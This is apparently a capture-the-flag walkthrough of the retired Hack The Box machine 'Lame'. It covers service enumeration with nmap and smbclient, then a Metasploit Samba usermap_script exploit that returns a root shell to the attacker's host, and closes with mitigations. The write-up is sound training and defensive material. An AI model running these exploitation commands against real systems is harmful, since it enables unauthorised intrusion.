> [!NOTE]
> **Machine notes.** Credentials and flags are redacted; output is illustrative.
> Lame is retired; complete it on Hack The Box for the real values.

## Executive summary

Lame is an old easy Linux machine. Modern tooling makes it quick, which is exactly
why it is useful: the box rewards enumeration order and version research rather
than exploitation skill.

The decision is which of several exposed services is the intended path.

## Machine information

| Field | Value |
| --- | --- |
| Platform | Hack The Box |
| Machine | Lame |
| Difficulty | Easy (retired) |
| Operating system | Linux |
| Category | Service enumeration |
| Skills | Version research, exploit selection, shell stabilisation |

## Objectives

- Enumerate exposed services and identify versions precisely.
- Research candidate vulnerabilities and choose the least disruptive path.
- Obtain a shell and stabilise it.
- Record why the chosen service was the intended one.

## Tools used

| Tool | Purpose |
| --- | --- |
| `nmap` | Service and version detection |
| `searchsploit` | Public exploit lookup |
| Metasploit | Exploitation framework |
| `netcat` | Shell handling |

## Initial reconnaissance

```bash
nmap -Pn -sV -sC -p- <machine-ip> -oN nmap-lame.txt
```

Expect FTP, SSH, SMB and possibly other services. Versions matter more than port
numbers here: old Samba and old FTP daemons are the candidates.

## Enumeration

```bash
nmap -Pn -sV --script "ftp-anon,smb-os-discovery" -p 21,139,445 <machine-ip>
```

```bash
smbclient -L //<machine-ip>/ -N
```

Record:

| Service | Version | Candidate issue |
| --- | --- | --- |
| FTP | Old daemon | Known backdoor class |
| SMB | Samba 3.x | Known remote command execution |
| SSH | Modern | Not the path |

## Vulnerability identification

Two public issues apply to the era of this machine:

1. A backdoored FTP daemon that executes a command on a specific trigger.
2. A Samba version with a remote command execution flaw.

Both are documented. Choose one, confirm the version, and note why the other is a
fallback. "It worked" is not an explanation if the version did not match.

## Exploitation

Using the framework for the SMB path:

```text
msf6 > use exploit/multi/samba/usermap_script
msf6 > set RHOSTS <machine-ip>
msf6 > set LHOST <your-vpn-ip>
msf6 > run
```

The resulting session runs as root on this machine because the vulnerable service
runs as root. Verify:

```text
id
```

For the FTP path, the trigger is a command sequence rather than a payload. Either
way, record the exact version string that justified the choice.

## Privilege escalation

Not required: the vulnerable daemon runs with high privilege. Confirm the context
rather than assuming:

```bash
id
sudo -l
```

If a shell arrives as a low-privilege user, the standard Linux checks apply
(`sudo -l`, SUID binaries, cron, capabilities).

## Flags and completion evidence

Flags are redacted. Record the version strings, the exploit module used, and the
resulting `id` output.

## Lessons learned

- Version accuracy is the core skill on legacy boxes.
- Multiple viable paths should be ranked, not chosen at random.
- A daemon running as root turns a service bug into full compromise.
- Retired machines are still useful for practising enumeration order.

## Mitigation and remediation

| Issue | Control |
| --- | --- |
| Unpatched Samba | Patch; remove SMBv1-era configurations |
| Backdoored software | Verify supply chain; use signed packages |
| Services running as root | Drop privileges in service configuration |
| Legacy protocols exposed | Restrict at the firewall |

## References

- Hack The Box — Lame.
- Samba security advisories.
- MITRE ATT&CK — Exploitation of Remote Services.
